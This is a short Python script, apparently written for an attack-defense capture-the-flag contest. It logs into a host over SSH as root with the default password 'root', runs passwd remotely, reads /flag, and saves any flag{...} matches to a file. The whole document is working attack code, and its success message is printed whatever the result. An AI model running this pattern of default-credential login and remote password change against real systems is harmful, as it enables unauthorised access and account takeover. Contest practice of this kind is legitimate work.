import paramiko
import socket
import re  
hostname='172.16.103.72'
port = 22
username = 'root'
password = 'root'
timeout = 1  # 设置超时时间为1秒
print("处理主机:", hostname)

    # 创建SSH客户端
client = paramiko.SSHClient()
    # 自动添加主机密钥
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
        # 连接远程主机
        client.connect(hostname, port, username, password, timeout=timeout)

        # 执行远程命令
        stdin, stdout, stderr = client.exec_command('''
        password="root"
        # 使用passwd命令修改密码
        echo -e "$password\n$password" | passwd "$USER" >/dev/null 2>&1
        # 检查密码是否成功修改
        if [ $? -eq 0 ]; then
            echo "修改密码成功"
        else
            echo "修改密码失败"
        fi
        cat /flag
        ''', timeout=timeout)

        # 打印命令输出
        a=stdout.read().decode().strip()
        print('修改密码成功')
        matches = re.findall(r'flag\{.*?\}', a)
        with open('./flag.txt', 'w', encoding='utf-8') as file:  
            for match in matches:  
                file.write(match + '\n')  # 每个匹配项后添加一个换行符
except (socket.timeout, paramiko.ssh_exception.SSHException) as e:
        print(hostname, "连接失败或超时:", str(e))

finally:
        # 关闭SSH连接
        client.close()